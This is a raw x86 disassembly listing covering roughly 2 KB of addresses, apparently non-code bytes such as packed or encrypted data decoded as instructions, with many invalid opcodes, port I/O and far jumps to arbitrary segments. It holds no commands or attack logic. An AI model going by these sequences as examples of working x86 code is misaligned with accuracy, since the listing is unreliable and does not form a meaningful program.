  412b61:	iret   
  412b62:	inc    ebx
  412b63:	cwde   
  412b64:	out    dx,al
  412b65:	mov    bl,0xd
  412b67:	xor    al,0xb6
  412b69:	mov    al,BYTE PTR [eax+0x23]
  412b6c:	jmp    0x6db4:0x5d1bc4f9
  412b73:	or     BYTE PTR [ebp+edx*4-0x4b],bl
  412b77:	out    dx,eax
  412b78:	xchg   esp,eax
  412b79:	mov    cl,BYTE PTR [eax+0x1b80aeb6]
  412b7f:	mov    ds:0x2eae41c7,al
  412b84:	sti    
  412b85:	jbe    0x412b38
  412b87:	adc    eax,0x2265a236
  412b8c:	call   0xba22:0x6a5c05cb
  412b93:	scas   al,BYTE PTR es:[edi]
  412b94:	enter  0xdf98,0xc0
  412b98:	jecxz  0x412b1e
  412b9a:	shr    BYTE PTR ds:0x40157514,cl
  412ba0:	cmp    ah,BYTE PTR [eax]
  412ba2:	pop    eax
  412ba4:	test   edx,edx
  412ba6:	lods   eax,DWORD PTR ds:[esi]
  412ba7:	sub    eax,esp
  412ba9:	push   esi
  412baa:	push   edi
  412bab:	cmc    
  412bac:	in     eax,0xc6
  412bae:	pop    esp
  412baf:	lods   eax,DWORD PTR ds:[esi]
  412bb0:	or     esp,DWORD PTR [eax+0x47]
  412bb3:	mov    eax,ds:0x81fdf57a
  412bb8:	push   ebx
  412bb9:	sbb    eax,0xe1ffc411
  412bbf:	push   esi
  412bc0:	jg     0x412b60
  412bc2:	push   0xffffffb0
  412bc4:	rol    BYTE PTR [ecx],1
  412bc6:	mov    ch,0xa8
  412bc8:	popf   
  412bc9:	add    BYTE PTR [ebx-0x2a],bl
  412bcc:	xchg   edx,eax
  412bcd:	push   ecx
  412bce:	pop    ebp
  412bcf:	sub    dl,BYTE PTR [eax]
  412bd1:	test   eax,0xb05b08f
  412bd6:	(bad)  [esi-0x6d7dcccb]
  412bdc:	ret    
  412bdd:	sbb    eax,0x10675654
  412be2:	lock sub ch,0xd6
  412be6:	mov    dh,0xf3
  412be8:	mov    bl,0xac
  412bea:	(bad)  
  412beb:	sti    
  412bec:	mov    dh,0xc1
  412bee:	adc    DWORD PTR [esi],esi
  412bf0:	outs   dx,BYTE PTR ds:[esi]
  412bf1:	lea    ebp,[eax+0x3ca541a3]
  412bf7:	enter  0x46cf,0x5
  412bfb:	cmp    esp,DWORD PTR [eax-0x25]
  412bfe:	dec    ebp
  412bff:	gs (bad) 
  412c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c02:	mov    edx,0x29aaed05
  412c07:	bound  edx,QWORD PTR [edi]
  412c09:	arpl   si,dx
  412c0b:	mov    eax,DWORD PTR [eax]
  412c0d:	push   ss
  412c0e:	fcmovnb st,st(2)
  412c10:	inc    esi
  412c11:	test   eax,0xa31b51bf
  412c16:	cld    
  412c17:	push   ebx
  412c18:	cmp    DWORD PTR [ecx-0x57],esp
  412c1b:	sub    eax,0x1164f900
  412c20:	push   cs
  412c21:	not    BYTE PTR [edx+0x4b]
  412c24:	sbb    eax,0xd38774b1
  412c29:	dec    edx
  412c2a:	pop    edx
  412c2b:	inc    esp
  412c2c:	push   0x209bdf8f
  412c31:	cs mov ch,0x7e
  412c34:	push   eax
  412c35:	es jae 0x412c1f
  412c38:	(bad)  
  412c39:	(bad)  
  412c3a:	aam    0x46
  412c3c:	mov    ch,0xd0
  412c3e:	inc    ebp
  412c3f:	sbb    BYTE PTR es:[edx],cl
  412c42:	inc    eax
  412c43:	jns    0x412ca2
  412c45:	inc    ebp
  412c46:	fdiv   QWORD PTR [esi+0x79867071]
  412c4c:	xor    DWORD PTR [ecx],0x6a
  412c4f:	les    eax,FWORD PTR [esi+0x26e4b620]
  412c55:	ret    0x4a69
  412c58:	and    DWORD PTR [edi],edx
  412c5a:	or     dl,cl
  412c5c:	push   ecx
  412c5d:	addps  xmm7,XMMWORD PTR [ebx+0x43]
  412c61:	shl    ebx,0xb5
  412c64:	ins    DWORD PTR es:[edi],dx
  412c65:	adc    edx,DWORD PTR ds:0x86ea893e
  412c6b:	cs pop ecx
  412c6d:	mov    BYTE PTR [eax-0x3b314f4c],bh
  412c73:	fmul   QWORD PTR [eax+0x62]
  412c76:	sbb    eax,0xa0b6089b
  412c7b:	ins    DWORD PTR es:[edi],dx
  412c7c:	fwait
  412c7d:	inc    esi
  412c7e:	jnp    0x412cf1
  412c80:	mov    eax,0xc004d577
  412c85:	cs pop edi
  412c87:	jmp    0x6d6f2da2
  412c8c:	inc    ebx
  412c8d:	aad    0x16
  412c8f:	(bad)  
  412c90:	fidiv  DWORD PTR [edi]
  412c92:	idiv   BYTE PTR [edi-0x17]
  412c95:	dec    esi
  412c96:	adc    al,0x6c
  412c98:	test   al,0xcb
  412c9a:	sbb    al,0xf9
  412c9c:	xor    eax,0xb6176ae2
  412ca1:	push   ss
  412ca2:	lods   al,BYTE PTR ds:[esi]
  412ca3:	or     eax,0x38e8ebbe
  412ca8:	push   ebp
  412ca9:	pop    esp
  412caa:	fild   DWORD PTR [esi]
  412cac:	and    eax,0x9901d6d8
  412cb1:	or     BYTE PTR [edx+0x26c171c5],ch
  412cb7:	mov    ds:0xc8920ea5,al
  412cbc:	jns    0x412d32
  412cbe:	mov    al,ds:0x4db6d6e
  412cc3:	lahf   
  412cc4:	cmc    
  412cc5:	adc    al,0x74
  412cc7:	jmp    DWORD PTR [edi+0x362fec7a]
  412ccd:	fdivr  DWORD PTR [edx+0x6b7f4900]
  412cd3:	data16 fst QWORD PTR [esi+eax*2]
  412cd7:	pop    ecx
  412cd8:	pop    edx
  412cd9:	stos   BYTE PTR es:[edi],al
  412cda:	lods   eax,DWORD PTR ss:[esi]
  412cdc:	and    bh,dl
  412cde:	add    edx,DWORD PTR [ebx+ebx*1]
  412ce1:	add    ebx,ebx
  412ce3:	outs   dx,DWORD PTR ds:[esi]
  412ce4:	aam    0x2c
  412ce6:	mov    dh,0x2c
  412ce8:	add    BYTE PTR [esi+0x45],0x43
  412cec:	push   esi
  412ced:	fisub  WORD PTR [edi-0x6a4f4e4a]
  412cf3:	mov    bh,0xa4
  412cf5:	sbb    BYTE PTR ds:0x47b0a561,bh
  412cfb:	sub    BYTE PTR [eax-0x13],dl
  412cfe:	(bad)  
  412cff:	push   esi
  412d00:	adc    ah,cl
  412d02:	mov    ebx,0x342d6356
  412d07:	call   0x7e97:0x58a8e4d8
  412d0e:	sbb    DWORD PTR [edi],esi
  412d10:	stos   BYTE PTR es:[edi],al
  412d11:	mov    ah,0x6d
  412d13:	push   esp
  412d14:	jle    0x412d57
  412d16:	sbb    cl,ch
  412d18:	jp     0x412d6f
  412d1a:	xor    al,0xb6
  412d1c:	lods   eax,DWORD PTR ds:[esi]
  412d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d1e:	int3   
  412d1f:	sahf   
  412d20:	mov    cl,0xe1
  412d22:	add    eax,0x3fb68da0
  412d27:	repnz clc 
  412d29:	cdq    
  412d2a:	das    
  412d2b:	or     BYTE PTR ds:[edx],bh
  412d2e:	mov    al,ds:0xe096ce4b
  412d33:	push   ebp
  412d34:	cmp    eax,0xb42c50a2
  412d39:	xchg   ebp,eax
  412d3a:	and    dl,bl
  412d3c:	and    al,0x5a
  412d3e:	push   0xffffffaa
  412d40:	lods   eax,DWORD PTR ss:[esi]
  412d42:	xchg   ebp,eax
  412d43:	pop    ebp
  412d44:	mov    ch,0x32
  412d46:	or     DWORD PTR [esi],esp
  412d48:	sub    dh,BYTE PTR [esi+0x531923a5]
  412d4e:	stc    
  412d4f:	xchg   ebp,eax
  412d50:	outs   dx,BYTE PTR ds:[esi]
  412d51:	dec    ebp
  412d52:	shl    BYTE PTR [ebp+0x7f88ef57],1
  412d58:	sbb    edi,DWORD PTR [edi-0x14]
  412d5b:	int3   
  412d5c:	mov    eax,ds:0xa3ad8a50
  412d61:	in     eax,dx
  412d62:	repnz repnz lds esi,FWORD PTR [ebx+0x5b]
  412d67:	or     eax,0x27234280
  412d6c:	pop    eax
  412d6d:	fidivr DWORD PTR [eax-0x2cf49250]
  412d73:	inc    edx
  412d74:	sub    ebp,esp
  412d76:	sub    BYTE PTR [esi-0x7a8be8b7],0xad
  412d7d:	ins    DWORD PTR es:[edi],dx
  412d7e:	mov    dl,BYTE PTR [esi-0x40d67306]
  412d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d85:	rcr    edx,0xda
  412d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d89:	test   DWORD PTR [ebx+eiz*4+0x1cff8c27],edx
  412d90:	mov    ecx,0x4d05ef86
  412d95:	push   ebp
  412d96:	pop    esp
  412d97:	ret    0x555c
  412d9a:	add    al,0x5c
  412d9c:	mov    BYTE PTR [eax],dh
  412d9e:	inc    eax
  412d9f:	sub    al,0xa2
  412da1:	push   es
  412da2:	leave  
  412da3:	mov    cl,0xd4
  412da5:	add    esp,ebx
  412da7:	xor    cl,BYTE PTR cs:[edx+0xd3e257a]
  412dae:	mov    al,0x5d
  412db0:	xor    BYTE PTR [eax+0x5e2d12bd],dh
  412db6:	push   eax
  412db7:	xchg   ebx,esp
  412db9:	call   0x7880dec
  412dbe:	enter  0xa215,0xeb
  412dc2:	jo     0x412d63
  412dc4:	adc    eax,0xc5b76c0e
  412dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dca:	mov    BYTE PTR [eax+0x2df0c66e],cl
  412dd0:	ins    DWORD PTR es:[edi],dx
  412dd1:	inc    ebx
  412dd2:	aad    0xad
  412dd4:	(bad)  
  412dd6:	dec    esp
  412dd7:	mul    dl
  412dd9:	push   cs
  412dda:	icebp  
  412ddb:	(bad)  
  412ddc:	push   0xffffff8a
  412dde:	mov    edx,0x5cc7686d
  412de3:	out    dx,al
  412de4:	test   DWORD PTR [eax+0x155da8c9],edi
  412dea:	fcomp  QWORD PTR [eax-0xa]
  412ded:	inc    edx
  412dee:	mov    WORD PTR [edi-0x6e],ds
  412df1:	push   cs
  412df2:	mov    BYTE PTR [ebx-0x1c],bl
  412df5:	adc    eax,0x385dcc9e
  412dfa:	fist   DWORD PTR [edi+0x17]
  412dfd:	fimul  DWORD PTR [ebx+0x4a]
  412e00:	sub    DWORD PTR [esi],edx
  412e02:	cmp    DWORD PTR [esi+0xb62ad50],edi
  412e08:	outs   dx,BYTE PTR ds:[esi]
  412e09:	dec    ebx
  412e0a:	in     eax,dx
  412e0b:	adc    ah,BYTE PTR [edx+edi*4+0x30]
  412e0f:	push   0xe9bfabc8
  412e14:	inc    ebp
  412e15:	push   0xcba81b5b
  412e1a:	outs   dx,DWORD PTR ds:[esi]
  412e1b:	dec    edi
  412e1c:	loop   0x412dab
  412e1e:	push   esi
  412e1f:	jb     0x412e54
  412e21:	outs   dx,DWORD PTR ds:[esi]
  412e22:	pop    esp
  412e23:	push   0xffffffd2
  412e25:	sub    dh,BYTE PTR [ebp-0x7]
  412e28:	add    dh,bh
  412e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e2b:	or     esi,DWORD PTR [esi-0x3ebb292a]
  412e31:	mov    WORD PTR [ebp+eiz*8-0x25627820],ss
  412e38:	push   cs
  412e39:	mov    ch,ch
  412e3b:	add    eax,0x989cc5b1
  412e40:	sar    BYTE PTR [esi+0xe],cl
  412e43:	mov    bh,0xb6
  412e45:	ins    DWORD PTR es:[edi],dx
  412e46:	fcomp  QWORD PTR [ebx-0x254ba095]
  412e4c:	mov    al,0xdb
  412e4e:	(bad)  
  412e50:	sbb    DWORD PTR ds:0xa22d6db,ebx
  412e56:	jns    0x412ec5
  412e58:	push   esi
  412e59:	xlat   BYTE PTR ds:[ebx]
  412e5a:	pop    esp
  412e5b:	mov    ds,esp
  412e5d:	pop    eax
  412e5e:	push   0x4
  412e60:	pop    es
  412e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e62:	cs daa 
  412e64:	ins    BYTE PTR es:[edi],dx
  412e65:	xchg   ebx,eax
  412e66:	mov    dh,0xad
  412e68:	pop    ebp
  412e69:	push   0xcb2f5ed8
  412e6e:	ret    0x8d38
  412e71:	push   esi
  412e72:	jb     0x412eb5
  412e74:	(bad)  [eax+0x17]
  412e77:	or     ah,BYTE PTR [edi+0x284e44a8]
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	test   DWORD PTR [esi+0x3341da0b],esi
  412e84:	or     ebx,DWORD PTR [esi+0x2edd02d9]
  412e8a:	pop    ebx
  412e8b:	pop    ebx
  412e8c:	mov    al,ds:0xc5501db6
  412e91:	fdivr  DWORD PTR [ebx-0x498b6189]
  412e97:	ins    DWORD PTR es:[edi],dx
  412e98:	sub    al,0x6c
  412e9a:	inc    edi
  412e9b:	stos   DWORD PTR es:[edi],eax
  412e9c:	adc    ebx,DWORD PTR [edi-0x1e0abc00]
  412ea2:	pop    esp
  412ea3:	mov    bh,0x2
  412ea5:	ins    DWORD PTR es:[edi],dx
  412ea6:	fstp   TBYTE PTR [esp+edi*4-0x104ea9d0]
  412ead:	fstp   QWORD PTR [edx+0x76d6ed53]
  412eb3:	push   esp
  412eb4:	test   eax,0x82ca351
  412eb9:	das    
  412eba:	push   eax
  412ebb:	pop    esp
  412ebc:	ret    0xdb12
  412ebf:	push   es
  412ec0:	aam    0x97
  412ec2:	push   0xe8e243f6
  412ec7:	call   0x86041154
  412ecc:	cs out 0x39,eax
  412ecf:	int    0x3e
  412ed1:	mov    eax,0x6fdd4035
  412ed6:	stc    
  412ed7:	adc    cl,BYTE PTR [esi+0x7cc96201]
  412edd:	sbb    bh,BYTE PTR ss:[ebx-0xf18b456]
  412ee4:	jmp    0x960b:0x5b6e8857
  412eeb:	shl    DWORD PTR [ecx+0xe],1
  412eee:	jmp    0xcd039a88
  412ef3:	sub    eax,0x59db6d04
  412ef8:	dec    esi
  412ef9:	mov    WORD PTR [esi-0x4d],ss
  412efc:	and    BYTE PTR ds:0x1535b023,bh
  412f02:	cdq    
  412f03:	sub    ch,cl
  412f05:	sbb    al,0x66
  412f07:	push   es
  412f08:	ins    DWORD PTR es:[edi],dx
  412f09:	adc    BYTE PTR [ebx+ecx*1+0x7c],ch
  412f0d:	jl     0x412f83
  412f0f:	xor    BYTE PTR [eax-0x7b],al
  412f12:	les    edx,FWORD PTR [esi]
  412f14:	inc    ebp
  412f15:	add    eax,DWORD PTR [ebx-0x245c2c8b]
  412f1b:	pusha  
  412f1c:	xor    DWORD PTR [edx+0x6b],0x1d
  412f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f21:	inc    esp
  412f22:	ins    DWORD PTR es:[edi],dx
  412f23:	mov    eax,ds:0x7507609b
  412f28:	loope  0x412f54
  412f2a:	out    0xfb,al
  412f2c:	jecxz  0x412f48
  412f2e:	out    dx,eax
  412f2f:	fild   DWORD PTR [ebx]
  412f31:	pop    esp
  412f32:	jne    0x412f45
  412f34:	pop    esi
  412f35:	fs ds jne 0x412fa5
  412f39:	sbb    ebp,ebp
  412f3b:	inc    esi
  412f3c:	sbb    ebx,DWORD PTR [ecx]
  412f3e:	cli    
  412f3f:	bound  eax,QWORD PTR [esi]
  412f41:	jle    0x412fba
  412f43:	lods   eax,DWORD PTR ds:[esi]
  412f44:	fcmovnb st,st(2)
  412f46:	mov    dh,0x2d
  412f48:	div    DWORD PTR [esi+eiz*1]
  412f4b:	xchg   BYTE PTR [edi-0x3732e018],cl
  412f51:	out    0x35,eax
  412f53:	sub    eax,0x8a384b6d
  412f58:	mov    dh,0xdc
  412f5a:	dec    edx
  412f5b:	iret   
  412f5c:	cmc    
  412f5d:	shl    DWORD PTR [esi+0x1],0xb0
  412f61:	mov    al,0x5c
  412f63:	adc    eax,0x1f42f5af
  412f68:	sub    al,0xb8
  412f6a:	mov    cl,0xb5
  412f6c:	aam    0xe6
  412f6e:	jno    0x412fc6
  412f70:	dec    edi
  412f71:	(bad)  
  412f72:	int3   
  412f73:	test   al,0x6d
  412f75:	ret    0x8402
  412f78:	mov    ecx,DWORD PTR [eax+0x4c4c4757]
  412f7e:	aad    0x8e
  412f80:	jmp    0x3681:0x48d0e0b8
  412f87:	mov    esi,DWORD PTR [esi+0x23f620dd]
  412f8d:	je     0x412fbe
  412f8f:	js     0x412f62
  412f91:	or     DWORD PTR [eax+0xb],edx
  412f94:	pop    ebx
  412f95:	mov    ds:0x13ecc07,eax
  412f9a:	push   0x24
  412f9c:	sbb    eax,0xf75a1741
  412fa1:	push   edx
  412fa2:	cmp    DWORD PTR [eax-0x64],eax
  412fa5:	sar    BYTE PTR [esi-0x1b7ffc50],0x89
  412fac:	jo     0x412ffc
  412fae:	jns    0x412f5e
  412fb0:	add    BYTE PTR [ecx+eax*1+0x36],bh
  412fb4:	outs   dx,BYTE PTR ds:[esi]
  412fb5:	fist   DWORD PTR [esi-0x4d]
  412fb8:	popf   
  412fb9:	mov    DWORD PTR [esi-0x3f0cd2f],ecx
  412fbf:	fs pop eax
  412fc1:	mov    esi,0xf98aa2d1
  412fc6:	dec    ecx
  412fc7:	add    BYTE PTR [edx],cl
  412fc9:	dec    ebp
  412fca:	outs   dx,BYTE PTR ds:[esi]
  412fcb:	aad    0xa8
  412fcd:	push   0x687ea880
  412fd2:	add    edx,ebp
  412fd4:	lea    eax,[esi]
  412fd6:	fisub  DWORD PTR [ecx]
  412fd8:	enter  0x9bd3,0xbb
  412fdc:	sub    eax,0x163d6d6c
  412fe1:	add    ah,BYTE PTR [edi-0x4b5b921]
  412fe7:	in     eax,0x5
  412fe9:	jge    0x412fe7
  412feb:	mov    edx,0xf55c6d6d
  412ff0:	sbb    bl,al
  412ff2:	out    dx,eax
  412ff3:	cmp    eax,0x4b275877
  412ff8:	pop    eax
  412ff9:	sub    BYTE PTR [ebp-0x49d79693],0x8c
  413000:	in     al,0x7f
  413002:	cmp    al,0xc6
  413004:	lods   eax,DWORD PTR ds:[esi]
  413005:	ins    DWORD PTR es:[edi],dx
  413006:	sub    BYTE PTR [edi+eiz*4+0x3a],cl
  41300a:	mov    dh,0xe9
  41300c:	sti    
  41300d:	jns    0x413012
  41300f:	add    eax,0xd7b768dc
  413014:	ss push ds
  413016:	adc    DWORD PTR ds:0xd542195f,edx
  41301c:	mov    dh,0x1d
  41301e:	es ds icebp 
  413021:	push   esi
  413022:	cdq    
  413023:	out    dx,eax
  413024:	ret    0xb4b6
  413027:	xchg   ebp,eax
  413028:	mov    al,ds:0xc868e3db
  41302d:	mov    ebp,0xed4b1bb3
  413032:	(bad)  
  413033:	shl    BYTE PTR [eax+0x55],cl
  413036:	push   cs
  413037:	into   
  413038:	and    edi,DWORD PTR [ebx]
  41303a:	movq   QWORD PTR [esi+0x2065b54b],xmm6
  413042:	cdq    
  413043:	or     BYTE PTR [ebx-0x5c],dh
  413046:	fwait
  413047:	push   esi
  413048:	(bad)  
  413049:	aad    0xd2
  41304b:	(bad)  
  41304c:	(bad)  
  41304d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41304f:	rol    DWORD PTR [esi+eax*2],1
  413052:	cwde   
  413053:	xor    al,0x14
  413055:	rol    DWORD PTR ss:[esi],0xc7
  413059:	mov    ds:0xd71c241,al
  41305e:	jno    0x4130b9
  413060:	push   0x7a8bf81d
  413065:	call   0x3433:0x74eb7322
  41306c:	add    DWORD PTR [eax+0x37d1c7e4],esi
  413072:	ror    DWORD PTR [edx],cl
  413074:	pop    eax
  413075:	add    BYTE PTR [esp+ebp*1-0x25],bl
  413079:	jg     0x4130e8
  41307b:	mov    bh,BYTE PTR [eax-0x14e1602f]
  413081:	mov    ds:0x6a8140c3,al
  413086:	nop
  413087:	mov    ds:0xc73211ad,eax
  41308c:	lods   al,BYTE PTR ds:[esi]
  41308d:	cli    
  41308e:	scas   al,BYTE PTR es:[edi]
  41308f:	loop   0x4130e7
  413091:	stos   DWORD PTR es:[edi],eax
  413092:	cmp    BYTE PTR ds:0xdb3c860b,bh
  413098:	ins    DWORD PTR es:[edi],dx
  413099:	arpl   WORD PTR [ebx+0x18135d11],cx
  41309f:	mov    ds:0xa12e2ac2,al
  4130a4:	je     0x41310e
  4130a6:	add    DWORD PTR [ebp+0x11],ecx
  4130a9:	pop    edx
  4130aa:	mov    dh,0xa2
  4130ac:	push   edx
  4130ad:	mov    ch,0x6e
  4130af:	pop    ebx
  4130b0:	int    0xbc
  4130b2:	loopne 0x413090
  4130b4:	gs inc ebx
  4130b6:	jmp    0xadab8c2c
  4130bb:	lods   eax,DWORD PTR ds:[esi]
  4130bc:	and    bl,BYTE PTR [edx-0xf]
  4130bf:	mov    ebx,0x58d75f62
  4130c4:	stos   BYTE PTR es:[edi],al
  4130c5:	sub    BYTE PTR [ebx+eax*2-0x7e],dl
  4130c9:	push   eax
  4130ca:	mov    bh,0x16
  4130cc:	cmp    al,BYTE PTR [edx]
  4130ce:	mov    ebx,edx
  4130d0:	sar    BYTE PTR [edi-0x343c00db],1
  4130d6:	inc    ecx
  4130d7:	pop    ss
  4130d8:	adc    DWORD PTR [edi+edi*8-0x47],ebx
  4130dc:	jg     0x4130b9
  4130de:	ret    0x6d8d
  4130e1:	sahf   
  4130e2:	out    0x66,al
  4130e4:	lea    edi,[edx+esi*2]
  4130e7:	mov    edi,DWORD PTR [eax+ecx*1-0x7e]
  4130eb:	ins    DWORD PTR es:[edi],dx
  4130ec:	add    DWORD PTR [esi-0x48fec4e6],esi
  4130f2:	mov    al,ds:0x3ada3e77
  4130f7:	call   0xb205da42
  4130fc:	sub    BYTE PTR [eax+0x3e],bh
  4130ff:	in     eax,0xeb
  413101:	add    BYTE PTR [eax+0x9],ch
  413104:	lock in al,0xd9
  413107:	das    
  413108:	fwait
  413109:	or     eax,0x44751722
  41310e:	pop    ss
  41310f:	mov    bh,0x89
  413111:	inc    edi
  413112:	jo     0x4130ef
  413114:	mov    dh,0x8f
  413116:	inc    ecx
  413117:	sub    DWORD PTR [ecx],ebp
  413119:	(bad)  
  41311a:	loopne 0x413128
  41311c:	pop    ds
  41311d:	mov    ds:0x616d8a9a,eax
  413122:	sbb    eax,0xa18791c7
  413127:	test   eax,0x825167be
  41312c:	or     dh,BYTE PTR [edi]
  41312e:	xchg   DWORD PTR [eax],ebx
  413130:	cwde   
  413131:	adc    ebp,DWORD PTR [esi-0x4f47a7de]
  413137:	xchg   ebx,eax
  413138:	fstp   TBYTE PTR [esi+0x4a9d9ee2]
  41313e:	push   edi
  41313f:	ins    DWORD PTR es:[edi],dx
  413140:	xchg   edi,eax
  413141:	call   0x95f6:0x74fb9fc8
  413148:	cli    
  413149:	push   0x6d
  41314b:	imul   edx,DWORD PTR [edi],0x28
  41314e:	js     0x41319e
  413150:	test   al,0x5c
  413152:	jmp    0x1dc1e797
  413157:	inc    eax
  413158:	(bad)  [esp+ebx*8-0x7e894083]
  41315f:	dec    esp
  413160:	mov    dh,0xd
  413162:	stos   BYTE PTR es:[edi],al
  413163:	and    esi,DWORD PTR [ebp+0x4d22355c]
  413169:	jo     0x413157
  41316b:	mov    al,ds:0x39cbd1b8
  413170:	add    BYTE PTR [edx+0x0],0xb9
  413174:	test   BYTE PTR [ebx+0x6e],bl
  413177:	cmp    DWORD PTR [edx],ebp
  413179:	pop    ds
  41317a:	mov    dl,0x1
  41317c:	push   0xc0b63e23
  413181:	ins    DWORD PTR es:[edi],dx
  413182:	rol    DWORD PTR [eax+0x21],0x64
  413186:	out    dx,al
  413187:	mov    al,0x57
  413189:	push   edi
  41318a:	call   0x79b8:0x3c436da2
  413191:	dec    ebp
  413192:	cmp    DWORD PTR [edi+0x60a190f2],edi
  413198:	xor    DWORD PTR [ebx+0x41af1b6],0xc89d56db
  4131a2:	mov    eax,ds:0x1d6e9dfe
  4131a7:	inc    esp
  4131a8:	pop    ss
  4131a9:	and    dl,BYTE PTR [ebx-0x64f76df3]
  4131af:	retf   0x4c0a
  4131b2:	ins    BYTE PTR es:[edi],dx
  4131b3:	fcmovnbe st,st(6)
  4131b5:	sahf   
  4131b6:	(bad)  
  4131b7:	out    0x32,eax
  4131b9:	mov    ds:0x703a72a4,eax
  4131be:	fld    TBYTE PTR [eax+0x37]
  4131c1:	xor    BYTE PTR [edx+0x7c18200b],bh
  4131c7:	ret    0x20cf
  4131ca:	pop    ebp
  4131cb:	add    bl,bl
  4131cd:	lods   eax,DWORD PTR ds:[esi]
  4131ce:	popa   
  4131cf:	push   esi
  4131d0:	jns    0x413223
  4131d2:	repnz mov dl,BYTE PTR [ebp-0x4a]
  4131d6:	das    
  4131d7:	ins    DWORD PTR es:[edi],dx
  4131d8:	or     ecx,DWORD PTR [ebx-0x20]
  4131db:	fwait
  4131dc:	dec    ecx
  4131dd:	fmul   DWORD PTR [edx+0x45]
  4131e0:	push   eax
  4131e1:	out    0x62,eax
  4131e3:	add    BYTE PTR [ebx],bl
  4131e5:	or     eax,0x9858cb44
  4131ea:	in     al,0xde
  4131ec:	adc    ch,BYTE PTR [edi-0x64]
  4131ef:	mov    ebx,0xa46c6ed4
  4131f4:	adc    al,0x9
  4131f6:	jae    0x41321e
  4131f8:	sbb    dl,BYTE PTR [ecx]
  4131fa:	cld    
  4131fb:	repnz bound ecx,QWORD PTR [edx+0x0]
  4131ff:	in     eax,dx
  413200:	inc    edx
  413201:	hlt    
  413202:	mov    DWORD PTR [ebp-0x4a4b971a],ebx
  413208:	push   eax
  413209:	and    ah,bl
  41320b:	and    eax,0xdadc8b28
  413210:	lea    eax,[ebp+0x667d246]
  413216:	push   ecx
  413217:	add    cl,BYTE PTR [ebx+0x35b6e17a]
  41321d:	test   al,0xa0
  41321f:	push   ebx
  413220:	frstor [ebp-0x57]
  413223:	mov    ah,0x22
  413225:	mov    ch,0xb0
  413227:	mov    ch,0x6d
  413229:	mov    edx,0x775cd114
  41322e:	int    0x28
  413230:	ret    
  413231:	(bad)  
  413233:	loope  0x4131eb
  413235:	pop    ds
  413236:	das    
  413237:	aam    0xd1
  413239:	jo     0x41322c
  41323b:	sbb    DWORD PTR [ecx],0xffffffed
  41323e:	mov    ebx,0x4b0b5bb5
  413243:	push   cs
  413244:	jb     0x4131c8
  413246:	pop    esp
  413247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413248:	mov    ecx,0xfca0fbd0
  41324d:	ret    0xe242
  413250:	inc    edi
  413251:	sbb    al,0xc3
  413253:	iret   
  413254:	add    cl,dl
  413256:	jle    0x4131dd
  413258:	(bad)  
  413259:	lods   eax,DWORD PTR ds:[esi]
  41325a:	pop    ebp
  41325b:	add    ecx,esi
  41325d:	(bad)
  413261:	retf   0x7ccc
  413264:	push   eax
  413265:	pop    esp
  413266:	push   0xffffffb7
  413268:	pop    ds
  413269:	out    0xc9,al
  41326b:	pop    ds
  41326c:	or     edi,DWORD PTR [edx+0x7]
  41326f:	dec    esi
  413270:	imul   ebp,DWORD PTR [ebx+0x40],0xc476435
  413277:	adc    al,0xfd
  413279:	sti    
  41327a:	fadd   DWORD PTR [ebp+0x75]
  41327d:	popa   
  41327e:	sub    DWORD PTR [ecx-0x67],esp
  413281:	and    ch,al
  413283:	cmp    DWORD PTR [eax+0x5b6d8179],ecx
  413289:	sbb    DWORD PTR [esi-0x6b],eax
  41328c:	add    al,0xb3
  41328e:	mov    eax,ds:0x4400fa69
  413293:	push   0x5
  413295:	xchg   ebp,eax
  413296:	pusha  
  413297:	xchg   edi,eax
  413298:	dec    edx
  413299:	les    ecx,FWORD PTR [esi-0x33dae47e]
  41329f:	xor    BYTE PTR [edi+0x17],dl
  4132a2:	push   es
  4132a3:	mov    cs,WORD PTR [eax-0x247d3ab3]
  4132a9:	xor    BYTE PTR [edx+0x75],0x4c
  4132ad:	mov    ah,0xf1
  4132af:	aam    0xad
  4132b1:	inc    ebx
  4132b2:	jg     0x413333
  4132b4:	scas   al,BYTE PTR es:[edi]
  4132b5:	adc    eax,0xb7f98aa4
  4132ba:	lods   eax,DWORD PTR ds:[esi]
  4132bb:	mov    DWORD PTR [edx-0x14f7fae6],edi
  4132c1:	fwait
  4132c2:	add    eax,0xbe6ae050
  4132c7:	outs   dx,BYTE PTR ds:[esi]
  4132c8:	sbb    ecx,ebx
  4132ca:	or     edx,DWORD PTR [edx-0x3f]
  4132cd:	add    BYTE PTR [esp+ecx*2-0x63a348c7],cl
  4132d4:	sub    bl,BYTE PTR [ebx-0x25]
  4132d7:	mov    gs,WORD PTR [eax]
  4132d9:	pop    ebx
  4132da:	sub    BYTE PTR [eax+0x1a],bl
  4132dd:	push   0xb1b64a1c
  4132e2:	jne    0x413328
  4132e4:	test   BYTE PTR [eax-0x1d],cl
  4132e7:	retf   
  4132e8:	jle    0x413298
  4132ea:	pop    ecx
  4132eb:	mov    edx,0x12db6e15
  4132f0:	cmp    al,bl
  4132f2:	bound  ecx,QWORD PTR [ecx+edi*8]
  4132f5:	and    eax,0x685661f8
  4132fa:	pop    ebx
  4132fb:	jmp    0xf5c8:0x68fc322a
  413302:	sbb    BYTE PTR [edx+0x3b05b6a0],0x60
  413309:	sub    DWORD PTR [edi],0xffffff89
  41330c:	adc    DWORD PTR [ebp+0x11],esi
  41330f:	ins    BYTE PTR es:[edi],dx
  413310:	xchg   edi,eax
  413311:	add    eax,0x6fe0e01
  413316:	pop    ecx
  413317:	scas   eax,DWORD PTR es:[edi]
  413318:	or     ebx,ebx
  41331a:	mov    dh,0xb0
  41331c:	aam    0x3d
  41331e:	jl     0x413356
  413320:	push   0x420da6e
  413325:	jbe    0x413341
  413327:	mov    dh,BYTE PTR [esi-0x63c771f5]
  41332d:	and    BYTE PTR [edx],bh
  41332f:	adc    ebp,eax
  413331:	or     ecx,DWORD PTR [ebx]
  413333:	mov    ?,WORD PTR [esi+0x6d0d5391]
  413339:	das    
